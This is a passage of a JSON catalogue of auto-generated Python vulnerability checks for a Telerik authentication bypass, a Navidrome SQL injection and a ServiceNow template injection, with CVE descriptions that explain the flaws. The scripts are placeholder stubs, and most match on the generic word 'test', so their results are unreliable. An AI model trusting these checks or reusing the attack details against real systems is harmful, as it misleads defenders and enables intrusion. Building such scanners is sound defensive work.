          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: CVE-2024-4358\nName: Progress Telerik Report Server - Authentication Bypass\nSeverity: critical\nDescription: In Progress Telerik Report Server, version 2024 Q1 (10.0.24.305) or earlier, on IIS, an unauthenticated attacker can gain access to Telerik Report Server restricted functionality via an authentication bypass vulnerability.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_CVE_2024_4358:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"CVE-2024-4358\"\n    SEVERITY = \"critical\"\n    NAME = \"Progress Telerik Report Server - Authentication Bypass\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[OR] DSL: contains(content_type_2, \"application/json\"); contains_all(body_2, \"access_token\", \"userName\", \"token_type\")'\n\n        # Simple word matcher simulation\n        matchers = ['test']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Progress Telerik Report Server - Authentication Bypass\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_CVE_2024_4358(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: CVE-2024-4358\nName: Progress Telerik Report Server - Authentication Bypass\nSeverity: critical\nDescription: In Progress Telerik Report Server, version 2024 Q1 (10.0.24.305) or earlier, on IIS, an unauthenticated attacker can gain access to Telerik Report Server restricted functionality via an authentication bypass vulnerability.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_CVE_2024_4358:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"CVE-2024-4358\"\n    SEVERITY = \"critical\"\n    NAME = \"Progress Telerik Report Server - Authentication Bypass\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[OR] DSL: contains(content_type_2, \"application/json\"); contains_all(body_2, \"access_token\", \"userName\", \"token_type\")'\n\n        # Simple word matcher simulation\n        matchers = ['test']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Progress Telerik Report Server - Authentication Bypass\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_CVE_2024_4358(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "cve",
          "cve2024",
          "telerik",
          "progress",
          "auth-bypass",
          "instrusive",
          "kev",
          "vkev",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_c_v_e_2024_47062",
        "name": "Navidrome < 0.53.0 - Authenticated SQL Injection",
        "language": "Python",
        "famille": "CVE",
        "description": "Navidrome is an open source web-based music collection server and streamer. Navidrome automatically adds parameters in the URL to SQL queries. This can be exploited to access information by adding parameters like `password=...` in the URL (ORM Leak). Furthermore, the names of the parameters are not properly escaped, leading to SQL Injections. Finally, the username is used in a `LIKE` statement, allowing people to log in with `%` instead of their username. When adding parameters to the URL, they are automatically included in an SQL `LIKE` statement (depending on the parameter's name). This allows attackers to potentially retrieve arbitrary information. For example, attackers can use the following request to test whether some encrypted passwords start with `AAA`. This results in an SQL query like `password LIKE 'AAA%'`, allowing attackers to slowly brute-force passwords. When adding parameters to the URL, they are automatically added to an SQL query. The names of the parameters are not properly escaped. This behavior can be used to inject arbitrary SQL code (SQL Injection). These vulnerabilities can be used to leak information and dump the contents of the database and have been addressed in release version 0.53.0. Users are advised to upgrade. There are no known workarounds for this vulnerability.",
        "severity": "critical",
        "detection": "",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          },
          {
            "name": "username",
            "datatype": "string",
            "required": false,
            "description": "Variable Nuclei custom: username",
            "default": "{{username}}"
          },
          {
            "name": "password",
            "datatype": "string",
            "required": false,
            "description": "Variable Nuclei custom: password",
            "default": "{{password}}"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: CVE-2024-47062\nName: Navidrome < 0.53.0 - Authenticated SQL Injection\nSeverity: critical\nDescription: Navidrome is an open source web-based music collection server and streamer. Navidrome automatically adds parameters in the URL to SQL queries. This can be exploited to access information by adding parameters like `password=...` in the URL (ORM Leak). Furthermore, the names of the parameters are not properly escaped, leading to SQL Injections. Finally, the username is used in a `LIKE` statement, allowing people to log in with `%` instead of their username. When adding parameters to the URL, they are automatically included in an SQL `LIKE` statement (depending on the parameter's name). This allows attackers to potentially retrieve arbitrary information. For example, attackers can use the following request to test whether some encrypted passwords start with `AAA`. This results in an SQL query like `password LIKE 'AAA%'`, allowing attackers to slowly brute-force passwords. When adding parameters to the URL, they are automatically added to an SQL query. The names of the parameters are not properly escaped. This behavior can be used to inject arbitrary SQL code (SQL Injection). These vulnerabilities can be used to leak information and dump the contents of the database and have been addressed in release version 0.53.0. Users are advised to upgrade. There are no known workarounds for this vulnerability.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_CVE_2024_47062:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"CVE-2024-47062\"\n    SEVERITY = \"critical\"\n    NAME = \"Navidrome < 0.53.0 - Authenticated SQL Injection\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = ''\n\n        # Simple word matcher simulation\n        matchers = ['test']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Navidrome < 0.53.0 - Authenticated SQL Injection\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_CVE_2024_47062(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: CVE-2024-47062\nName: Navidrome < 0.53.0 - Authenticated SQL Injection\nSeverity: critical\nDescription: Navidrome is an open source web-based music collection server and streamer. Navidrome automatically adds parameters in the URL to SQL queries. This can be exploited to access information by adding parameters like `password=...` in the URL (ORM Leak). Furthermore, the names of the parameters are not properly escaped, leading to SQL Injections. Finally, the username is used in a `LIKE` statement, allowing people to log in with `%` instead of their username. When adding parameters to the URL, they are automatically included in an SQL `LIKE` statement (depending on the parameter's name). This allows attackers to potentially retrieve arbitrary information. For example, attackers can use the following request to test whether some encrypted passwords start with `AAA`. This results in an SQL query like `password LIKE 'AAA%'`, allowing attackers to slowly brute-force passwords. When adding parameters to the URL, they are automatically added to an SQL query. The names of the parameters are not properly escaped. This behavior can be used to inject arbitrary SQL code (SQL Injection). These vulnerabilities can be used to leak information and dump the contents of the database and have been addressed in release version 0.53.0. Users are advised to upgrade. There are no known workarounds for this vulnerability.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_CVE_2024_47062:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"CVE-2024-47062\"\n    SEVERITY = \"critical\"\n    NAME = \"Navidrome < 0.53.0 - Authenticated SQL Injection\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = ''\n\n        # Simple word matcher simulation\n        matchers = ['test']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Navidrome < 0.53.0 - Authenticated SQL Injection\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_CVE_2024_47062(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "cve",
          "cve2024",
          "sqli",
          "orm-leak",
          "navidrome",
          "authenticated",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_c_v_e_2024_4879",
        "name": "ServiceNow UI Macros - Template Injection",
        "language": "Python",
        "famille": "CVE",
        "description": "ServiceNow has addressed an input validation vulnerability that was identified in Vancouver and Washington DC Now Platform releases. This vulnerability could enable an unauthenticated user to remotely execute code within the context of the Now Platform. ServiceNow applied an update to hosted instances, and ServiceNow released the update to our partners and self-hosted customers. Listed below are the patches and hot fixes that address the vulnerability. If you have not done so already, we recommend applying security patches relevant to your instance as soon as possible.",
        "severity": "critical",
        "detection": "[AND] mot(s) '<div class=\"outputmsg_text\">1787569</div>' | mot(s) 'text/html' | status HTTP [200]",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: CVE-2024-4879\nName: ServiceNow UI Macros - Template Injection\nSeverity: critical\nDescription: ServiceNow has addressed an input validation vulnerability that was identified in Vancouver and Washington DC Now Platform releases. This vulnerability could enable an unauthenticated user to remotely execute code within the context of the Now Platform. ServiceNow applied an update to hosted instances, and ServiceNow released the update to our partners and self-hosted customers. Listed below are the patches and hot fixes that address the vulnerability. If you have not done so already, we recommend applying security patches relevant to your instance as soon as possible.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_CVE_2024_4879:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"CVE-2024-4879\"\n    SEVERITY = \"critical\"\n    NAME = \"ServiceNow UI Macros - Template Injection\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[AND] mot(s) \\'<div class=\"outputmsg_text\">1787569</div>\\' | mot(s) \\'text/html\\' | status HTTP [200]'\n\n        # Simple word matcher simulation\n        matchers = ['<div class=\"outputmsg_text\">1787569</div>', 'text/html']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n   